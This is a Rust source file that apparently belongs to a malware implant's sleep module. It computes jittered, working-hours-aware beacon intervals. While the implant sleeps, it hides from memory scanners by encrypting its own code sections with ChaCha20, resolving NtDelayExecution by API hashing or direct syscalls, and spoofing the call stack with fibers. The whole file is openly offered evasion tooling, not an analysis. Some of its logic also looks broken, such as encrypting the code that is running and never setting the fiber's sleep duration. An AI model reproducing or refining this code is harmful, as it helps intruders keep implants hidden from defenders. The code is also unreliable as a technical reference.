use anyhow::Result;
use common::config::{SleepMethod, SleepConfig};
use log::debug;
#[cfg(windows)]
use log::info;
use rand::{thread_rng, Rng};

pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
    let mut base = config.base_interval_secs as f64;
    if let (Some(start), Some(end), Some(mult)) = (config.working_hours_start, config.working_hours_end, config.off_hours_multiplier) {
        let now = (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs() / 3600 % 24) as u32;
        if now < start || now >= end {
            base *= mult as f64;
            debug!("Applying off-hours sleep multiplier: {}", mult);
        }
    }
    let mut rng = thread_rng();
    let jitter_frac = (config.jitter_percent as f64) / 100.0;
    let jitter_val = base * jitter_frac;
    let offset = rng.gen_range(-jitter_val..=jitter_val);
    std::time::Duration::from_secs_f64((base + offset).max(1.0))
}

#[cfg(windows)]
pub fn execute_sleep(duration: std::time::Duration, method: &SleepMethod) -> Result<()> {
    match method {
        SleepMethod::Ekko | SleepMethod::Foliage => {
            info!("Initiating Foliage-style sleep for {:?}", duration);
            #[cfg(target_arch = "x86_64")]
            unsafe {
                use winapi::um::synchapi::WaitForSingleObject;
                use winapi::shared::ntdef::{NTSTATUS, LARGE_INTEGER};
                use std::ffi::c_void;
                
                // Foliage uses NtDelayExecution
                
                crypto::encrypt_sections();
                spoof::spoof_stack();

                let duration_100ns = -(duration.as_nanos() as i64 / 100);
                let delay = duration_100ns;
                
                let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
                let nt_delay_execution_addr = pe_resolve::get_proc_address_by_hash(ntdll.unwrap_or(0), pe_resolve::hash_str(b"NtDelayExecution\0")).unwrap_or(0);
                let addr = nt_delay_execution_addr as *const ();
                if !addr.is_null() {
                    let function: extern "system" fn(u8, *const i64) -> i32 = std::mem::transmute(addr);
                    function(0, &delay);
                }

                spoof::restore_stack();
                crypto::decrypt_sections();
            }
            #[cfg(not(target_arch = "x86_64"))]
            std::thread::sleep(duration);
            Ok(())
        }
        _ => {
            info!("Standard sleep for {:?}", duration);
            std::thread::sleep(duration);
            Ok(())
        }
    }
}

pub mod crypto {
    use rand::RngCore;
    #[cfg(windows)]
    use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};

    thread_local! {
        static SESSION_KEY: std::cell::RefCell<[u8; 32]> = std::cell::RefCell::new([0; 32]);
        /// Per-session random nonce for ChaCha20.  Generated alongside the key
        /// in encrypt_sections() and consumed in decrypt_sections().  A fresh
        /// nonce each cycle eliminates any keystream-reuse risk.
        static SESSION_NONCE: std::cell::RefCell<[u8; 12]> = std::cell::RefCell::new([0; 12]);
        /// Set to true after a successful encrypt_sections() so decrypt_sections()
        /// can refuse to run with a zero key.
        static SESSION_INITIALIZED: std::cell::Cell<bool> = std::cell::Cell::new(false);
    }

    #[cfg(windows)]
    unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> {
        use winapi::um::libloaderapi::GetModuleHandleA;
        use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
        
        let mut sections = Vec::new();
        let base = GetModuleHandleA(std::ptr::null_mut());
        if base.is_null() { return sections; }
        
        let dos = base as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE { return sections; }
        
        let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
        if (*nt).Signature != IMAGE_NT_SIGNATURE { return sections; }
        
        let mut section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
        for _ in 0..(*nt).FileHeader.NumberOfSections {
            let name = (*section).Name;
            if name[0..5] == [b'.', b't', b'e', b'x', b't'] || name[0..6] == [b'.', b'r', b'd', b'a', b't', b'a'] {
                let addr = (base as usize + (*section).VirtualAddress as usize) as *mut u8;
                let size = *(*section).Misc.VirtualSize() as usize;
                sections.push((addr, size));
            }
            section = (section as usize + std::mem::size_of::<IMAGE_SECTION_HEADER>()) as *const _;
        }
        sections
    }

    #[cfg(not(windows))]
    unsafe fn get_code_sections() -> Vec<(*mut u8, usize, i32)> {
        // Parse /proc/self/maps to locate executable (r-xp) and read-only (r--p)
        // memory regions that belong to the current binary.
        // Returns (addr, size, original_prot) so decrypt_sections can restore the
        // exact original protection instead of blindly using PROT_READ|PROT_EXEC
        // on all regions, which breaks .rodata / .data sections (L-03 fix).
        use std::io::{BufRead, BufReader};
        let exe_path = match std::env::current_exe() {
            Ok(p) => p.to_string_lossy().to_string(),
            Err(_) => return Vec::new(),
        };
        let f = match std::fs::File::open("/proc/self/maps") {
            Ok(f) => f,
            Err(_) => return Vec::new(),
        };
        let mut sections = Vec::new();
        for line in BufReader::new(f).lines().flatten() {
            // Format: <start>-<end> <perms> <offset> <dev> <inode> [pathname]
            if !line.contains("r-xp") && !line.contains("r--p") { continue; }
            if !line.contains(&exe_path) { continue; }
            let mut fields = line.split_whitespace();
            let addr_range = match fields.next() {
                Some(r) => r,
                None => continue,
            };
            let perms = match fields.next() {
                Some(p) => p,
                None => continue,
            };
            // Convert perms string to libc PROT_* flags
            let orig_prot = {
                let exec = perms.as_bytes().get(2).copied() == Some(b'x');
                if exec {
                    libc::PROT_READ | libc::PROT_EXEC
                } else {
                    libc::PROT_READ
                }
            };
            let mut parts = addr_range.splitn(2, '-');
            let start_hex = parts.next().unwrap_or("0");
            let end_hex = parts.next().unwrap_or("0");
            let start = usize::from_str_radix(start_hex, 16).unwrap_or(0);
            let end = usize::from_str_radix(end_hex, 16).unwrap_or(0);
            if start == 0 || end <= start { continue; }
            sections.push((start as *mut u8, end - start, orig_prot));
        }
        sections
    }

    #[cfg(windows)]
    pub fn encrypt_sections() {
        #[cfg(feature = "memory-guard")]
        {
            let _ = crate::memory_guard::guard_memory();
            return;
        }

        #[cfg(not(feature = "memory-guard"))]
        unsafe {
            let mut key = [0u8; 32];
            rand::thread_rng().fill_bytes(&mut key);
            let mut nonce = [0u8; 12];
            rand::thread_rng().fill_bytes(&mut nonce);
            SESSION_KEY.with(|k| { *k.borrow_mut() = key; });
            SESSION_NONCE.with(|n| { *n.borrow_mut() = nonce; });
            SESSION_INITIALIZED.with(|c| c.set(true));

            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());

            // Zero local key/nonce variables
            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
            std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);

            for (addr, mut size) in get_code_sections() {
                let mut old_protect = 0u32;
                let mut base_addr = addr as *mut winapi::ctypes::c_void;

                #[cfg(feature = "direct-syscalls")]
                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                    (-1isize) as usize as u64,
                    &mut base_addr as *mut _ as usize as u64,
                    &mut size as *mut _ as usize as u64,
                    winapi::um::winnt::PAGE_READWRITE as u64,
                    &mut old_protect as *mut _ as usize as u64,
                ); }
                #[cfg(not(feature = "direct-syscalls"))]
                { winapi::um::memoryapi::VirtualProtect(
                    base_addr, size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect,
                ); }
                
                let slice = std::slice::from_raw_parts_mut(addr, size);
                cipher.apply_keystream(slice);
                
                let mut temp = 0u32;
                #[cfg(feature = "direct-syscalls")]
                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                    (-1isize) as usize as u64,
                    &mut base_addr as *mut _ as usize as u64,
                    &mut size as *mut _ as usize as u64,
                    old_protect as u64,
                    &mut temp as *mut _ as usize as u64,
                ); }
                #[cfg(not(feature = "direct-syscalls"))]
                { winapi::um::memoryapi::VirtualProtect(
                    base_addr, size, old_protect, &mut temp,
                ); }
            }
        }
    }

    #[cfg(windows)]
    pub fn decrypt_sections() {
        #[cfg(feature = "memory-guard")]
        {
            let _ = crate::memory_guard::unguard_memory();
            return;
        }

        #[cfg(not(feature = "memory-guard"))]
        unsafe {
            if !SESSION_INITIALIZED.with(|c| c.get()) {
                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping to avoid garbage write");
                return;
            }
            SESSION_INITIALIZED.with(|c| c.set(false));
            let mut key = [0u8; 32];
            SESSION_KEY.with(|k| { key = *k.borrow(); });
            let mut nonce = [0u8; 12];
            SESSION_NONCE.with(|n| { nonce = *n.borrow(); });

            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
            
            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
            std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);

            for (addr, mut size) in get_code_sections() {
                let mut old_protect = 0u32;
                let mut base_addr = addr as *mut winapi::ctypes::c_void;

                #[cfg(feature = "direct-syscalls")]
                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                    (-1isize) as usize as u64,
                    &mut base_addr as *mut _ as usize as u64,
                    &mut size as *mut _ as usize as u64,
                    winapi::um::winnt::PAGE_READWRITE as u64,
                    &mut old_protect as *mut _ as usize as u64,
                ); }
                #[cfg(not(feature = "direct-syscalls"))]
                { winapi::um::memoryapi::VirtualProtect(
                    base_addr, size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect,
                ); }

                let slice = std::slice::from_raw_parts_mut(addr, size);
                cipher.apply_keystream(slice);
                
                let mut temp = 0u32;
                #[cfg(feature = "direct-syscalls")]
                { let _ = crate::syscalls::syscall_NtProtectVirtualMemory(
                    (-1isize) as usize as u64,
                    &mut base_addr as *mut _ as usize as u64,
                    &mut size as *mut _ as usize as u64,
                    old_protect as u64,
                    &mut temp as *mut _ as usize as u64,
                ); }
                #[cfg(not(feature = "direct-syscalls"))]
                { winapi::um::memoryapi::VirtualProtect(base_addr, size, old_protect, &mut temp); }
            }
        }
    }

    #[cfg(not(windows))]
    pub fn encrypt_sections() {
        use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
        unsafe {
            let mut key = [0u8; 32];
            rand::thread_rng().fill_bytes(&mut key);
            SESSION_KEY.with(|k| { *k.borrow_mut() = key; });
            SESSION_INITIALIZED.with(|c| c.set(true));
            let mut nonce = [0u8; 12];
            rand::thread_rng().fill_bytes(&mut nonce);
            SESSION_NONCE.with(|n| { *n.borrow_mut() = nonce; });
            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
            std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);
            let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
            for (addr, size, _orig_prot) in get_code_sections() {
                let aligned = (addr as usize) & !(page_size - 1);
                let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_WRITE);
                let slice = std::slice::from_raw_parts_mut(addr, size);
                cipher.apply_keystream(slice);
                // Encrypted: no permissions during sleep window (issue 5.1)
                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_NONE);
            }
        }
    }

    #[cfg(not(windows))]
    pub fn decrypt_sections() {
        use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
        unsafe {
            if !SESSION_INITIALIZED.with(|c| c.get()) {
                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
                return;
            }
            SESSION_INITIALIZED.with(|c| c.set(false));
            let mut key = [0u8; 32];
            SESSION_KEY.with(|k| { key = *k.borrow(); });
            let mut nonce = [0u8; 12];
            SESSION_NONCE.with(|n| { nonce = *n.borrow(); });
            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
            std::ptr::write_volatile(&mut nonce as *mut _, [0u8; 12]);
            let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
            for (addr, size, orig_prot) in get_code_sections() {
                let aligned = (addr as usize) & !(page_size - 1);
                let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_WRITE);
                let slice = std::slice::from_raw_parts_mut(addr, size);
                cipher.apply_keystream(slice);
                // Restore the original protection — PROT_READ|PROT_EXEC for .text,
                // PROT_READ for .rodata/.data (L-03 fix; was always PROT_READ|PROT_EXEC).
                libc::mprotect(aligned as *mut libc::c_void, aligned_size, orig_prot);
            }
        }
    }
}

pub mod spoof {
    /// Thread-local state for fiber-based stack spoofing.
    thread_local! {
        static MAIN_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
            std::cell::Cell::new(std::ptr::null_mut());
        static SLEEP_FIBER: std::cell::Cell<*mut std::ffi::c_void> =
            std::cell::Cell::new(std::ptr::null_mut());
        static SLEEP_DURATION_NS: std::cell::Cell<u64> = std::cell::Cell::new(0);
    }

    #[cfg(windows)]
    pub fn spoof_stack() {
        // Convert the current thread to a fiber so we can switch away from it.
        // This hides the current call stack during the sleep window.
        unsafe {
            use winapi::um::winbase::{ConvertThreadToFiber, CreateFiber, SwitchToFiber, DeleteFiber};

            // Only convert once per thread
            let main_fiber = MAIN_FIBER.with(|f| f.get());
            let main_fiber = if main_fiber.is_null() {
                let f = ConvertThreadToFiber(std::ptr::null_mut());
                if !f.is_null() {
                    MAIN_FIBER.with(|cell| cell.set(f));
                }
                f
            } else {
                main_fiber
            };

            if main_fiber.is_null() {
                log::warn!("spoof_stack: ConvertThreadToFiber failed");
                return;
            }

            // Create the sleep fiber if not yet created
            let sleep_fiber = SLEEP_FIBER.with(|f| f.get());
            let sleep_fiber = if sleep_fiber.is_null() {
                extern "system" fn sleep_fiber_proc(_param: *mut std::ffi::c_void) {
                    unsafe {
                        loop {
                            let ns = SLEEP_DURATION_NS.with(|c| c.get());
                            if ns > 0 {
                                // Sleep via NtDelayExecution-like spin using SleepEx
                                let ms = (ns / 1_000_000).max(1) as u32;
                                winapi::um::synchapi::Sleep(ms);
                            }
                            // Switch back to the main fiber
                            let main = MAIN_FIBER.with(|c| c.get());
                            if !main.is_null() {
                                SwitchToFiber(main);
                            }
                        }
                    }
                }
                let sf = CreateFiber(0, Some(sleep_fiber_proc), std::ptr::null_mut());
                if !sf.is_null() {
                    SLEEP_FIBER.with(|cell| cell.set(sf));
                }
                sf
            } else {
                sleep_fiber
            };

            if sleep_fiber.is_null() {
                log::warn!("spoof_stack: CreateFiber failed");
                return;
            }

            log::debug!("spoof_stack: switching to sleep fiber (main thread stack hidden)");
            // Switch to the sleep fiber — the current thread's call stack is
            // now hidden.  The sleep fiber will call Sleep() and then
            // SwitchToFiber(main_fiber), which resumes execution right here.
            SwitchToFiber(sleep_fiber);
        }
    }

    #[cfg(windows)]
    pub fn restore_stack() {
        // Switch back happens inside the sleep fiber proc automatically.
        // This function is a no-op since the fiber already returned control.
        log::debug!("restore_stack: resumed from sleep fiber");
    }

    #[cfg(not(windows))]
    pub fn spoof_stack() {}

    #[cfg(not(windows))]
    pub fn restore_stack() {}
}
